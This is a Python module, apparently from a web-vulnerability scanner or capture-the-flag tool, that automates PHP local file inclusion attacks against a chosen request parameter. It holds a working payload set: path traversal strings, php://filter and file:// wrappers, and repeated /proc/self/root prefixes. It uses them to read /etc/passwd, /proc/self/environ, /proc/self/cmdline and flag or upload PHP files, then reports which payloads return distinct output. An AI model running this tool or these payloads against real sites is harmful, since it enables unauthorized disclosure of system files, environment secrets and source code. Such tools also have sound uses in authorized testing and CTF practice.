import asyncio
from typing import List

from .mod import Mod, Page, Report, VulunableParam
from .requester import Requester

nonexist_files = [
    "/var/www/guessit{}.txt",
    "/guessit{}.txt",
    "./guessit{}.txt",
]

patterns = [
    protocol_pattern.format(dirpattern)
    for protocol_pattern in [
        "{}",
        "php://filter/read=convert.base64-encode/resource={}",
        "php://filter/write=string.rot13/resource={}",
        "php://filter/write=string.strip_tags|convert.base64-encode/resource={}",
        "file://{}",
    ]
    for dirpattern in [
        "{}",
        "../../../../../../..{}",
        "aaanonexistdirs/aaa/../../{}",
        "aaanonexistdirs/../{}",
        "/proc/self/root" * 22 + "{}",
        "aaanonexistdirs/../../../../" + "/proc/self/root" * 22 + "{}",
        "../../../../" + "/proc/self/root" * 22 + "{}",
    ]
]


filepaths = [
    "/proc/net/arp",
    "/proc/self/cmdline",
    "/proc/self/environ",
    "/etc/groups",
    "/etc/passwd",
    "/etc/bashrc",
] + [
    cwd + file
    for cwd in [
        "./",
        "",
        "/proc/self/cwd/",
        "/proc/self/root" * 22 + "/proc/self/cwd/",
    ]
    for file in [
        "index.php",
        "index",
        "flag.php",
        "flag",
        "upload.php",
        "download.php",
        "page.php",
    ]
]

REPORT_PATTERN = """\
以下这些payload会在 {url} 中的 {param} 参数产生特殊的回显：
pattern: {respond_patterns}
filepaths: {respond_filepaths}
"""


class PHPIncludeCrackMod(Mod):
    def __init__(self, requester: Requester):
        super().__init__()
        self.requeser = requester

    async def check(self, thing):
        if not isinstance(thing, VulunableParam):
            return 0
        params = (
            thing.frompage.params
            if thing.httpmethod == "GET"
            else thing.frompage.data
        )
        if params is None:
            return 0
        return 1

    async def submit_param(self, vulparam: VulunableParam, payload: str):
        params = (
            vulparam.frompage.params
            if vulparam.httpmethod == "GET"
            else vulparam.frompage.data
        )
        assert params is not None
        return await self.requeser.submit_to(
            vulparam.frompage.url,
            vulparam.httpmethod,
            {param: payload if param == vulparam.param else "asdf" for param in params},
        )

    async def crack_with_pattern(self, vulparam: VulunableParam, pattern: str):
        example_resps = await asyncio.gather(
            *[
                self.submit_param(vulparam, pattern.format(nonexist_file))
                for nonexist_file in nonexist_files
            ]
        )
        example_texts = set(resp.text for resp in example_resps)
        resps = await asyncio.gather(
            *[self.submit_param(vulparam, pattern.format(file)) for file in filepaths]
        )
        respond_files = [
            file
            for file, resp in zip(filepaths, resps)
            if resp.text not in example_texts
        ]
        return respond_files

    async def crack(self, vulparam: VulunableParam):
        results = await asyncio.gather(
            *[self.crack_with_pattern(vulparam, pattern) for pattern in patterns]
        )
        respond_payloads = [
            (pattern, filepath)
            for pattern, filepaths in zip(patterns, results)
            for filepath in filepaths
        ]
        respond_patterns = list(set(item[0] for item in respond_payloads))
        respond_filepaths = list(set(item[1] for item in respond_payloads))

        return [
            Report(
                REPORT_PATTERN.format(
                    url=vulparam.frompage.url,
                    param=vulparam.param,
                    respond_patterns=repr(respond_patterns),
                    respond_filepaths=repr(respond_filepaths),
                )
            )
        ]
